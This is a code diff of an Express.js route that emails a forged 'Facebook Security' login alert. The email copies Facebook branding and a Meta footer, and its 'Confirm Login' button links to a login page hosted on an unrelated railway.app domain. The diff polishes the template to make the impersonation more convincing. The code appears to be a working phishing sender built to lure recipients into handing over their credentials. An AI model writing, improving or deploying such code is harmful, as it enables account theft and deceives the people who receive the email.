@@ -8,122 +8,120 @@ try{
 const {email} = req.body
 
 if(!email){
-
-return res.status(400).json({
-success:false,
-message:"Email required"
-})
-
+    return res.status(400).json({
+        success:false,
+        message:"Email required"
+    })
 }
 
 const loginLink="https://security-system-production.up.railway.app/login.html"
 
 const emailTemplate=`
 
-<div style="background:#f0f2f5;padding:40px 0;font-family:Segoe UI,Arial">
-
-<div style="max-width:600px;margin:auto;background:white;border-radius:10px;
-box-shadow:0 6px 20px rgba(0,0,0,0.08);overflow:hidden">
-
-<div style="background:#1877f2;color:white;padding:18px 25px;
-font-size:18px;font-weight:600">
-
- Facebook Notification
-
+<div style="padding:25px 30px;background:#1877f2;color:white;text-align:center">
+  <img src="https://security-system-production.up.railway.app/images/logo.png"
+       alt="Facebook Security"
+       width="50" height="50"
+       style="border-radius:50%;margin-bottom:10px;display:block;margin-left:auto;margin-right:auto">
+  <div style="font-size:22px;font-weight:600;letter-spacing:.3px">Facebook Security</div>
+  <div style="font-size:13px;opacity:.85;margin-top:4px">Account Activity Notification</div>
 </div>
 
-<div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">
+<div style="background:#f0f2f5;padding:50px 0;font-family:Segoe UI,Arial,sans-serif">
 
-<p>Hello,</p>
+  <div style="max-width:620px;margin:auto;background:white;border-radius:12px;
+  box-shadow:0 10px 30px rgba(71, 69, 69, 0.53);overflow:hidden">
 
-<p>
-We detected a login request to your <strong>Facebook Security portal</strong>.
-To continue safely, please confirm the login below.
-</p>
+    <!-- HEADER -->
+    <div style="padding:25px 30px;background:#1877f2;color:white;text-align:center">
+      <div style="font-size:22px;font-weight:600;letter-spacing:.3px">Project Security</div>
+      <div style="font-size:13px;opacity:.85;margin-top:4px">Account Activity Notification</div>
+    </div>
 
-<div style="background:#f5f7fb;border-left:4px solid #1877f2;
-padding:20px;margin:25px 0;border-radius:6px">
+    <!-- BODY -->
+    <div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">
 
-<strong>Facebook Security Verification Required</strong>
+      <p style="margin-top:0;font-size:16px">Hello,</p>
 
-<p style="margin-top:10px;color:#444">
-Click the button below to access the secure login page.
-</p>
+      <p>
+        We noticed a login attempt to your <strong>Facebook Security portal</strong>.
+        To proceed securely, please confirm your login.
+      </p>
 
-<div style="text-align:center;margin-top:20px">
+      <!-- CTA BUTTON with hover -->
+      <div style="text-align:center;margin:35px 0">
+        <a href="${loginLink}" target="_blank"
+        style="background:#1877f2;color:white;text-decoration:none;
+        padding:14px 36px;border-radius:8px;font-weight:600;
+        font-size:15px;display:inline-block;
+        box-shadow:0 4px 12px rgba(24,119,242,0.35);
+        transition: all 0.3s ease;">
+          Confirm Login
+        </a>
+      </div>
 
-<a href="${loginLink}" target="_blank">
-style="background:#1877f2;color:white;text-decoration:none;
-padding:14px 30px;border-radius:6px;font-weight:bold">
+      <!-- Hover effect using inline style trick -->
+      <style>
+        a[href='${loginLink}']:hover {
+          background-color:#0f5ac9 !important;
+          box-shadow:0 6px 16px rgba(24, 111, 242, 0.45) !important;
+        }
+      </style>
 
- Login page
+      <!-- INFO BOX -->
+      <div style="background:#f7f9fc;border:1px solid #e4e6ebea;
+      padding:18px 20px;border-radius:6px;font-size:14px;color:#444">
+        If you did not request this login, you can safely proceed to this email.
+        No access will occur without verification.
+      </div>
 
-</a>
+      <p style="margin-top:30px;font-weight:600">
+        Facebook Security Team
+      </p>
 
-</div>
+    </div>
 
-</div>
+    <!-- FOOTER -->
+    <div style="border-top:1px solid #e4e6eb;padding:20px 30px;
+    font-size:12px;color:#65676b;background:#fafafa;line-height:1.5;text-align:center">
+      This is an automated security notification from Facebook Security.
+      <br><br>
+      © 2026 Meta Security · Privacy · Terms
+    </div>
 
-<p>
-If you did not request this login, you can safely comply this email.
-No access will occur without verification.
-</p>
-
-<p style="margin-top:25px;font-weight:600">
-
-Facebook Security Team
-
-</p>
-
-</div>
-
-<div style="border-top:1px solid #acacac;padding:18px 30px;
-font-size:12px;color:#65676b;background:#fafafa">
-
-This is an automated security notification.
-
-<br><br>
-
-© 2026 Meta Security. All rights reserved.  
-Privacy protection and secure login monitoring enabled.
-
-</div>
-
-</div>
+  </div>
 
 </div>
 `
 
 const sent = await sendEmail(
-email,
-"🔐 New Login Alert",
-emailTemplate
+    email,
+    "🔐 Confirm Your Login - Facebook Security",
+    emailTemplate
 )
 
 if(!sent){
-
-return res.status(500).json({
-success:false,
-message:"Email failed to send"
-})
-
+    return res.status(500).json({
+        success:false,
+        message:"Email failed to send"
+    })
 }
 
 codeService.addActivity(email,"Login alert email sent")
 
 return res.status(200).json({
-success:true,
-message:"Email sent successfully"
+    success:true,
+    message:"Email sent successfully"
 })
 
 }catch(error){
 
-console.error("Email sending error:",error)
+    console.error("Email sending error:",error)
 
-return res.status(500).json({
-success:false,
-message:"Server error"
-})
+    return res.status(500).json({
+        success:false,
+        message:"Server error"
+    })
 
 }
 
